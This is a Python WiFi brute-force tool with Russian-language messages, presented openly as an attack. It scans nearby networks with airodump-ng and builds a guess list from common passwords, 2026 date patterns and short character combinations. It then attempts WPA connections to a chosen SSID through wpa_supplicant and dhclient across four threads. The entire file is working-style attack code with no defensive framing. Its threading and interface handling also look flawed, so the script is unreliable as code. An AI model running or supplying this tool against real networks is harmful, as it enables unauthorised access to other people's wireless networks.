#!/usr/bin/env python3
"""
WiFi Bruteforce Script - Полный словарь + Генерация паролей
Дата: 2026
"""

import subprocess
import sys
import time
import re
import threading
import itertools
import string
from queue import Queue
from datetime import datetime

class WiFiBruteforce:
    def __init__(self, target_ssid=None):
        self.target_ssid = target_ssid
        self.interface = self.get_wireless_interface()
        self.password_queue = Queue()
        self.found_password = None
        self.stop_flag = False
        self.total_attempts = 0
        self.attempts_done = 0
        
    def get_wireless_interface(self):
        """Определение беспроводного интерфейса"""
        try:
            result = subprocess.run(['iwconfig'], capture_output=True, text=True)
            lines = result.stdout.split('\n')
            for line in lines:
                if 'IEEE 802.11' in line and not 'lo' in line:
                    interface = line.split()[0]
                    print(f"[+] Найден интерфейс: {interface}")
                    return interface
        except:
            pass
        
        # Fallback
        interfaces = ['wlan0', 'wlp2s0', 'wlp3s0', 'en0']
        for iface in interfaces:
            if subprocess.run(['ip', 'link', 'show', iface], capture_output=True).returncode == 0:
                print(f"[+] Использую интерфейс: {iface}")
                return iface
        return None
    
    def generate_password_dictionary(self):
        """Генерация паролей 2026"""
        print("[+] Генерация словаря паролей 2026...")
        
        # Год 2026
        year_patterns = [
            "2026", "20262026", "pass2026", "2026pass", "admin2026",
            "wifi2026", "2026wifi", "password2026", "user2026", "root2026",
            "2026!", "@2026", "2026@", "#2026", "2026#", "$2026", "2026$"
        ]
        
        # Текущие даты 2026
        current_date = datetime.now()
        months = [f"{current_date.year}{m:02d}" for m in range(1, 13)]
        days = [f"{current_date.year}{m:02d}{d:02d}" for m in range(1, 13) for d in range(1, 32)]
        
        # Основные пароли 2026 года
        common_2026 = [
            "12345678", "password", "123456789", "12345", "1234567890",
            "qwerty123", "admin123", "admin", "password123", "pass123",
            "11111111", "00000000", "88888888", "12341234", "123123123",
            "wifi1234", "wifi123", "internet", "123456789a", "qwertyuiop",
            "1q2w3e4r", "1qaz2wsx", "zaq12wsx", "qwerty12345", "abc12345",
            "password2023", "password2024", "password2025", "admin2023",
            "letmein", "welcome1", "master123", "hello123", "sunshine1",
            "1234567890", "9876543210", "11223344", "12344321", "1234567",
            "!@#$%^&*", "qwerty!", "passw0rd", "P@ssw0rd", "Admin@123",
            "password!", "123qwe!@#", "zaq12wsx", "!QAZ2wsx", "1qaz!QAZ",
        ]
        
        # Добавляем паттерны с 2026
        for pattern in year_patterns:
            common_2026.append(pattern)
        
        # Добавляем месяцы 2026
        for month in months:
            common_2026.append(month)
            common_2026.append(f"pass{month}")
            common_2026.append(f"{month}pass")
        
        # Добавляем даты (ограниченно)
        for day in days[:100]:
            common_2026.append(day)
        
        # Популярные комбинации 2026
        popular_suffixes = ["!", "@", "#", "$", "%", "123", "2026"]
        for base in ["admin", "user", "root", "wifi", "password", "pass"]:
            for suffix in popular_suffixes:
                common_2026.append(f"{base}{suffix}")
                common_2026.append(f"{base}{suffix}{suffix}")
        
        # Удаляем дубликаты
        common_2026 = list(set(common_2026))
        
        print(f"[+] Сгенерировано {len(common_2026)} паролей из словаря")
        return common_2026
    
    def generate_combinations(self):
        """Генерация комбинаторных паролей"""
        print("[+] Генерация комбинаторных паролей...")
        combinations = []
        
        chars = string.ascii_lowercase + string.digits
        year = "2026"
        
        # Базовые комбинации
        for i in range(1, 4):
            for combo in itertools.product(chars, repeat=i):
                comb_str = ''.join(combo)
                combinations.append(comb_str)
                combinations.append(comb_str + year)
                combinations.append(year + comb_str)
                if i <= 2:
                    combinations.append(comb_str.upper())
        
        # Специальные комбинации 2026
        common_words = ["admin", "user", "test", "wifi", "home", "guest", "default"]
        for word in common_words:
            combinations.append(word + year)
            combinations.append(year + word)
            combinations.append(word + year + "!")
            combinations.append(word.capitalize() + year)
        
        combinations = list(set(combinations))
        print(f"[+] Сгенерировано {len(combinations)} комбинаций")
        return combinations
    
    def scan_networks(self):
        """Сканирование WiFi сетей"""
        print("[+] Сканирование WiFi сетей...")
        try:
            subprocess.run(['sudo', 'iwconfig', self.interface, 'mode', 'monitor'], 
                          capture_output=True, timeout=5)
        except:
            pass
        
        scan_cmd = ['sudo', 'airodump-ng', self.interface]
        print("[+] Запуск сканера. Нажмите Ctrl+C через 30 секунд...")
        
        try:
            subprocess.run(scan_cmd, timeout=30)
        except subprocess.TimeoutExpired:
            pass
        except KeyboardInterrupt:
            pass
        
        print("\n[+] Введите SSID цели (или оставьте пустым для выбора из списка):")
        if not self.target_ssid:
            self.target_ssid = input("SSID: ")
        
        return self.target_ssid
    
    def attempt_connection(self, password):
        """Попытка подключения с паролем"""
        if self.stop_flag or self.found_password:
            return False
        
        self.attempts_done += 1
        if self.attempts_done % 10 == 0:
            progress = (self.attempts_done / self.total_attempts) * 100
            sys.stdout.write(f"\r[*] Прогресс: {progress:.1f}% ({self.attempts_done}/{self.total_attempts})")
            sys.stdout.flush()
        
        try:
            # Создание конфига для wpa_supplicant
            config = f"""ctrl_interface=/var/run/wpa_supplicant
network={{
    ssid="{self.target_ssid}"
    psk="{password}"
    key_mgmt=WPA-PSK
}}
"""
            with open('/tmp/wpa.conf', 'w') as f:
                f.write(config)
            
            result = subprocess.run(['sudo', 'wpa_supplicant', '-B', '-i', self.interface, 
                                    '-c', '/tmp/wpa.conf'], 
                                   capture_output=True, timeout=5)
            
            time.sleep(2)
            
            result = subprocess.run(['sudo', 'dhclient', '-v', self.interface], 
                                   capture_output=True, timeout=5)
            
            if result.returncode == 0:
                self.found_password = password
                print(f"\n\n[+] ПАРОЛЬ НАЙДЕН: {password}")
                return True
                
        except:
            pass
        
        # Очистка
        subprocess.run(['sudo', 'pkill', 'wpa_supplicant'], capture_output=True)
        subprocess.run(['sudo', 'dhclient', '-r', self.interface], capture_output=True)
        
        return False
    
    def worker(self):
        """Рабочий поток для проверки паролей"""
        while not self.stop_flag and not self.found_password:
            try:
                password = self.password_queue.get(timeout=1)
                if self.attempt_connection(password):
                    self.stop_flag = True
                    break
                self.password_queue.task_done()
            except:
                continue
    
    def run_bruteforce(self):
        """Запуск брутфорса"""
        print("\n" + "="*60)
        print("WiFi BRUTEFORCE SCRIPT v3.0 (2026)")
        print("="*60)
        
        if not self.interface:
            print("[-] Ошибка: Не найден беспроводной интерфейс")
            return
        
        # Получение словаря
        passwords = self.generate_password_dictionary()
        combinations = self.generate_combinations()
        
        # Объединение всех паролей
        all_passwords = passwords + combinations
        all_passwords = list(set(all_passwords))
        self.total_attempts = len(all_passwords)
        
        print(f"[+] Общее количество паролей: {self.total_attempts}")
        print(f"[+] Целевая сеть: {self.target_ssid or 'Не указана'}")
        
        # Если SSID не указан, сканируем
        if not self.target_ssid:
            self.scan_networks()
        
        # Заполнение очереди
        for password in all_passwords:
            self.password_queue.put(password)
        
        print("\n[+] Запуск атаки...")
        start_time = time.time()
        
        # Запуск рабочих потоков
        threads = []
        num_threads = 4  # Количество потоков
        
        for _ in range(num_threads):
            t = threading.Thread(target=self.worker)
            t.daemon = True
            t.start()
            threads.append(t)
        
        # Ожидание завершения
        self.password_queue.join()
        
        elapsed_time = time.time() - start_time
        
        print("\n" + "="*60)
        if self.found_password:
            print(f"[+] УСПЕХ! Найден пароль: {self.found_password}")
            print(f"[+] Время: {elapsed_time:.2f} секунд")
            print(f"[+] Попыток: {self.attempts_done}")
        else:
            print("[-] НЕУДАЧА: Пароль не найден в словаре")
            print("[-] Рекомендуется использовать более расширенный словарь")
        
        print("="*60)
        
        # Очистка
        subprocess.run(['sudo', 'pkill', 'wpa_supplicant'], capture_output=True)
        subprocess.run(['sudo', 'airmon-ng', 'stop', self.interface], capture_output=True)

def main():
    print("""
    ╔══════════════════════════════════════════╗
    ║     WIFI BRUTEFORCE TOOL (2026)         ║
    ║     Полный словарь + Генерация          ║
    ╚══════════════════════════════════════════╝
    """)
    
    # Проверка прав root
    if subprocess.run(['id', '-u'], capture_output=True).stdout.decode().strip() != '0':
        print("[-] Требуются права root! Запустите с sudo")
        sys.exit(1)
    
    # Выбор режима
    print("Режимы атаки:")
    print("1. Брутфорс по словарю + генерация (2026)")
    print("2. Брутфорс с указанием SSID")
    print("3. Сканирование сетей")
    
    choice = input("\nВыберите режим (1-3): ")
    
    wifi = WiFiBruteforce()
    
    if choice == "2":
        wifi.target_ssid = input("Введите SSID цели: ")
    elif choice == "3":
        wifi.scan_networks()
        wifi.target_ssid = input("\nВведите SSID для атаки: ")
    
    wifi.run_bruteforce()

if __name__ == "__main__":
    main()
